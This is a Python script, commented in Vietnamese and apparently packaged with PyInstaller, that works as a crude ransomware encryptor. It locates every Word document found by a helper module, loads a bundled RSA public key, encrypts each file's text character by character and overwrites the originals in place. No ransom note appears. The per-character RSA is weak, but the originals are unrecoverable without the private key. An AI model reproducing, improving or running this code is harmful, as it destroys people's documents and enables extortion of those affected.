from docx import Document
import sys
import os
import findWordFile

# Mã hóa văn bản bằng khóa công khai
def encrypt(public_key, plaintext):
    e, n = public_key
    encrypted_message = [(ord(char) ** e) % n for char in plaintext]
    return encrypted_message

# Đọc nội dung từ tài liệu Word
def read_docx(filename):
    doc = Document(filename)
    full_text = []
    for para in doc.paragraphs:
        full_text.append(para.text)
    return '\n'.join(full_text)

# Ghi nội dung vào tài liệu Word
def write_docx(filename, text):
    doc = Document()
    doc.add_paragraph(text)
    doc.save(filename)

# Mã hóa tài liệu Word
def encrypt_docx(input_filename, output_filename, public_key):
    plaintext = read_docx(input_filename)
    encrypted_message = encrypt(public_key, plaintext)
    encrypted_text = ' '.join(map(str, encrypted_message))
    write_docx(output_filename, encrypted_text)

### TEST ###
'''path =os.path.dirname(os.path.abspath(__file__)) #đường dẫn đến thư mục
path_word = path+"/test.docx"
encrypt_docx(path_word,path_word,public_key)'''
### TEST ###


findWordFile.exec() ## Tìm đường dẫn đến các file word

def resource_path(relative_path):
    # Trả về đường dẫn tuyệt đối tới các file tài nguyên, 
    # hỗ trợ cả khi chạy code và khi đóng gói bằng PyInstaller
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

###ENCRYPT###
path =os.path.dirname(os.path.abspath(__file__)) #đường dẫn đến thư mục


#IMPORT PUBLIC KEY 
# Mở file và đọc nội dung
path_publickey =  resource_path('public_key.txt')
with open(path_publickey, 'r') as file:
    content = file.read().strip()  # Đọc và loại bỏ khoảng trắng hai bên
# Chuyển đổi chuỗi thành tuple
# Tách các số bằng khoảng trắng và chuyển từng phần tử thành số nguyên
public_key = tuple(map(int, content.split()))

# Đường dẫn tới tệp của bạn
file_path = path+"/word_files_list.txt"

# Khởi tạo danh sách để lưu các dòng
lines = []
# Mở tệp và đọc từng dòng
with open(file_path, "r") as f:
    # Đọc tất cả các dòng và loại bỏ ký tự xuống dòng ở cuối mỗi dòng
    lines = [line.strip() for line in f]
# In danh sách các đường dẫn
print(lines)

for line in lines:
    encrypt_docx(line,line,public_key)
print("Success")

